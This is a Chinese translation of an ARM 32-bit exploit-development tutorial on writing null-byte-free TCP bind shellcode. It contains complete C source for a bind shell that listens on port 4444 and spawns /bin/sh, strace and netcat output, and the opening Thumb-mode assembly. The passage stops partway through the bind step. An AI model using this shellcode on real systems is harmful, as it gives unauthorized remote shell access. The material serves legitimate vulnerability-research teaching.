本文是[《TCP Bind Shell in Assembly (ARM 32-bit)》](https://azeria-labs.com/tcp-bind-shell-in-assembly-arm-32-bit/)的翻译文章。
在本教程中，你将学习如何编写没有空字节的TCP绑定(bind)
shellcode，并且可以使用其进行利用。当我们讨论漏洞利用时，指的是经过批准并且合法的漏洞研究。
至于软件漏洞研究新人，我可以告诉你，这些知识实际上可以用得很好。如果我发现了一个像堆栈溢出这样的漏洞并想测试其可利用性，那我就需要运行shellcode。
不仅如此，我还需要能成功利用该shellcode的技术，即使采取了安全措施，也可以执行shellcode。只有这样才能展示此漏洞的可利用性以及恶意攻击者可能利用的技术来利用安全漏洞。
完成本教程后，你不仅会知道如何编写能将shell绑定到本地端口的shellcode，还能知道如何编写任何针对这个问题的shellcode。从绑定shellcode到反向shellcode只是改变1-2个函数，一些参数，大多都是相同的。
编写绑定或反向shell比创建一个简单的execve() shell更困难。如果你想从更基础的开始，你可以学习如何在汇编中编写一个[简单的execve()
shell](https://xz.aliyun.com/t/4098)，然后再深入研究这个稍微更难的教程。
如果你需要复习Arm程序集的知识，请查看我的[ARM Assembly Basics](https://azeria-labs.com/writing-arm-assembly-part-1/)教程系列，或使用此备忘单：  
在开始之前，我想提醒你，我们正在写ARM shellcode，因此，如果还没有ARM的实验环境。 你可以自己设置（[使用QEMU模拟Raspberry
Pi](https://azeria-labs.com/emulate-raspberry-pi-with-qemu/)）或节约时间来下载我创建的现成的Lab VM（[ARM Lab VM](https://azeria-labs.com/arm-lab-vm/)）。 准备好了吗？
# 理解细节
首先，什么是绑定shell，它是如何工作的？
使用绑定shell，可以在目标计算机上打开通信端口或侦听器。然后，侦听器进入等待传入连接的状态，连接到它后，侦听器接受连接并将会为你提供对目标系统的shell访问。  
这与反向shell的工作方式不同。 使用反向shell，可以使目标计算机与你的计算机进行通信。
在这种情况下，你的计算机有一个侦听器端口，它能接收从目标系统返回的连接。  
根据目标环境，两种类型的shell都有其优点和缺点。 例如，更常见的情况是，目标网络的防火墙无法阻止传出的连接，而不是传入的连接。
这意味着你的绑定shell将绑定到目标系统上的端口，但由于传入的连接被阻止，你将无法连接到它。因此，在某些情况下，最好有一个可以利用允许传出连接的防火墙错误配置的反向shell。
如果你知道如何编写绑定shell，那么就会编写反向shell。 一旦你了解了汇编代码是如何完成的，只需要进行一些更改即可将汇编代码转换为反向shell。
要将绑定shell的函数转换为arm汇编，首先需要熟悉绑定shell的过程：
  1. 创建一个新的TCP套接字
  2. 将套接字绑定到本地端口
  3. 监听传入的连接
  4. 接收传入的连接
  5. 将STDIN，STDOUT和STDERR重定向到客户端新创建的套接字
  6. 生成shell
这是我们将用于翻译的C代码。
    #include  
    #include   
    #include  
    #include  
    int host_sockid;    // socket file descriptor 
    int client_sockid;  // client file descriptor 
    struct sockaddr_in hostaddr;            // server aka listen address
    int main() 
    { 
        // Create new TCP socket 
        host_sockid = socket(PF_INET, SOCK_STREAM, 0); 
        // Initialize sockaddr struct to bind socket using it 
        hostaddr.sin_family = AF_INET;                  // server socket type address family = internet protocol address
        hostaddr.sin_port = htons(4444);                // server port, converted to network byte order
        hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);   // listen to any address, converted to network byte order
        // Bind socket to IP/Port in sockaddr struct 
        bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr)); 
        // Listen for incoming connections 
        listen(host_sockid, 2); 
        // Accept incoming connection 
        client_sockid = accept(host_sockid, NULL, NULL); 
        // Duplicate file descriptors for STDIN, STDOUT and STDERR 
        dup2(client_sockid, 0); 
        dup2(client_sockid, 1); 
        dup2(client_sockid, 2); 
        // Execute /bin/sh 
        execve("/bin/sh", NULL, NULL); 
        close(host_sockid); 
        return 0; 
    }
# 第一阶段：系统调用及其参数
第一步是确定必要的系统调用，其参数和系统调用号。
看看上面的C代码，可以看到我们需要以下函数：socket，bind，listen，accept，dup2，execve。
可以使用以下命令计算出这些函数的系统调用号：
    pi@raspberrypi:~/bindshell $ cat /usr/include/arm-linux-gnueabihf/asm/unistd.h | grep socket
    #define __NR_socketcall             (__NR_SYSCALL_BASE+102)
    #define __NR_socket                 (__NR_SYSCALL_BASE+281)
    #define __NR_socketpair             (__NR_SYSCALL_BASE+288)
    #undef __NR_socketcall
_NR_SYSCALL_BASE的值为0：
    root@raspberrypi:/home/pi# grep -R "__NR_SYSCALL_BASE" /usr/include/arm-linux-gnueabihf/asm/
    /usr/include/arm-linux-gnueabihf/asm/unistd.h:#define __NR_SYSCALL_BASE 0
这些是我们需要的所有系统调用号：
    #define __NR_socket    (__NR_SYSCALL_BASE+281)
    #define __NR_bind      (__NR_SYSCALL_BASE+282)
    #define __NR_listen    (__NR_SYSCALL_BASE+284)
    #define __NR_accept    (__NR_SYSCALL_BASE+285)
    #define __NR_dup2      (__NR_SYSCALL_BASE+ 63)
    #define __NR_execve    (__NR_SYSCALL_BASE+ 11)
每个函数所需的参数都可以在[linux手册页](http://man7.org/linux/man-pages/index.html)或[w3challs.com](https://w3challs.com/syscalls/?arch=arm_strong)上找到。  
下一步是弄清楚这些参数的具体值。一种方法是使用strace查看成功的绑定shell连接。
Strace是一种可用于跟踪系统调用并监视进程与Linux内核之间交互的工具。 让我们使用strace来测试绑定shell的C版本。
为了减少干扰，我们将输出限制为需要的函数。
    Terminal 1:
    pi@raspberrypi:~/bindshell $ gcc bind_test.c -o bind_test
    pi@raspberrypi:~/bindshell $ strace -e execve,socket,bind,listen,accept,dup2 ./bind_test
    Terminal 2:
    pi@raspberrypi:~ $ netstat -tlpn
    Proto Recv-Q  Send-Q  Local Address  Foreign Address  State     PID/Program name
    tcp    0      0       0.0.0.0:22     0.0.0.0:*        LISTEN    - 
    tcp    0      0       0.0.0.0:4444   0.0.0.0:*        LISTEN    1058/bind_test 
    pi@raspberrypi:~ $ netcat -nv 0.0.0.0 4444
    Connection to 0.0.0.0 4444 port [tcp/*] succeeded!
这是我们的strace输出：
    pi@raspberrypi:~/bindshell $ strace -e execve,socket,bind,listen,accept,dup2 ./bind_test
    execve("./bind_test", ["./bind_test"], [/* 49 vars */]) = 0
    socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
    bind(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
    listen(3, 2) = 0
    accept(3, 0, NULL) = 4
    dup2(4, 0) = 0
    dup2(4, 1) = 1
    dup2(4, 2) = 2
    execve("/bin/sh", [0], [/* 0 vars */]) = 0
现在我们可以记下需要传递给arm汇编绑定shell函数的值。  
# 第二阶段：逐步解释
在第一阶段，我们回答了以下问题，以获得我们的汇编程序所需的一切：
  1. 我需要哪些函数？
  2. 这些函数的系统调用号是什么？
  3. 这些函数的参数是什么？
  4. 这些参数的值是什么？
这一步是关于应用这些知识并将其转化为汇编。 将每个函数拆分为单独的块并重复以下过程：
  1. 找出要用于哪个参数的寄存器
  2. 弄清楚如何将所需的值传递给这些寄存器
    1. 如何将立即值传递给寄存器
    2. 如何在不直接将＃0移入其中的情况下使寄存器无效（我们需要在代码中避免使用空字节，因此必须找到其他方法来使寄存器或内存中的值为空）
    3. 如何使寄存器指向内存中存储常量和字符串的区域
  3. 使用正确的系统调用号来调用该函数并跟踪寄存器值的变化
    1. 请记住，系统调用的结果将落在r0中，这意味着如果需要在另一个函数中重用该函数的结果，则需要在调用函数之前将其保存到另一个寄存器中。
    2. 示例：host_sockid = socket（2,1,0） - 套接字调用的结果（host_sockid）将落在r0中。 此结果在listen（host_sockid，2）等其他函数中重用，因此应保留在另一个寄存器中。
## 0 - 切换到Thumb模式
要减少遇到空字节的可能性，首先应该使用Thumb模式。 在Arm模式下，指令为32位，在Thumb模式下为16位。
这意味着我们可以通过简单地减小指令的大小来减少使用空字节的机会。
概述如何切换到Thumb模式，即ARM指令必须是4字节对齐的。要将模式从ARM更改为Thumb，请将下一条指令地址（在PC中找到）的LSB（最低有效位）设置为1，方法是将PC寄存器的值加1并将其保存到另一个寄存器。然后使用BX（分支和交换）指令分支到另一个寄存器，该寄存器包含LSB设置为1的下一条指令的地址，这使得处理器切换到Thumb模式。
这一切都可以归结为以下两条说明。
    .section .text
    .global _start
    _start:
        .ARM
        add     r3, pc, #1            
        bx      r3
从这里开始，你将编写Thumb代码，因此需要在代码中使用.THUMB指令会指明这一点。
## 1 - 创建新的套接字
这些是socket调用参数所需的值：
    root@raspberrypi:/home/pi# grep -R "AF_INET\|PF_INET \|SOCK_STREAM =\|IPPROTO_IP =" /usr/include/
    /usr/include/linux/in.h: IPPROTO_IP = 0,                               // Dummy protocol for TCP 
    /usr/include/arm-linux-gnueabihf/bits/socket_type.h: SOCK_STREAM = 1,  // Sequenced, reliable, connection-based
    /usr/include/arm-linux-gnueabihf/bits/socket.h:#define PF_INET 2       // IP protocol family. 
    /usr/include/arm-linux-gnueabihf/bits/socket.h:#define AF_INET PF_INET
设置参数后，使用svc指令调用套接字系统调用。 这个调用的结果将是我们的host_sockid，并且最终将以r0结尾。
由于稍后需要host_sockid，让我们将它保存到r4。  
在ARM中，你不能简单地将任何立即值移动到寄存器中。 如果你对这个细微差别的更多细节感兴趣，可以在[Memory
Instructions](https://azeria-labs.com/memory-instructions-load-and-store-part-4/)章节（后半段）中找到这一节。  
为了检查是否可以使用某个立即值，我写了一个名为[rotator.py](https://raw.githubusercontent.com/azeria-labs/rotator/master/rotator.py)的小脚本（一个简单的代码，献丑了）。
    pi@raspberrypi:~/bindshell $ python rotator.py
    Enter the value you want to check: 281
    Sorry, 281 cannot be used as an immediate number and has to be split.
    pi@raspberrypi:~/bindshell $ python rotator.py
    Enter the value you want to check: 200
    The number 200 can be used as a valid immediate number.
    50 ror 30 --> 200
    pi@raspberrypi:~/bindshell $ python rotator.py
    Enter the value you want to check: 81
    The number 81 can be used as a valid immediate number.
    81 ror 0 --> 81
最终代码段：
    .THUMB
        mov r0, #2
        mov r1, #1
        sub r2, r2, r2
        mov r7, #200
        add r7, #81 // r7 = 281 (socket syscall number) 
        svc #1 // r0 = host_sockid value 
        mov r4, r0 // save host_sockid in r4
## 2 - 将套接字绑定到本地端口
使用第一条指令，我们将一个包含地址族、主机端口和主机地址的结构对象存储在文本池中，并使用pc相关寻址引用该对象。
文字池是存储常量，字符串或偏移量的同一部分中的内存区域（因为文字池是代码的一部分）。 你可以使用带标签的ADR指令，而不是手动计算pc相对偏移量。
ADR接受PC相对表达式，即带有可选偏移量的标签，其中标签的地址相对于PC标签。 像这样：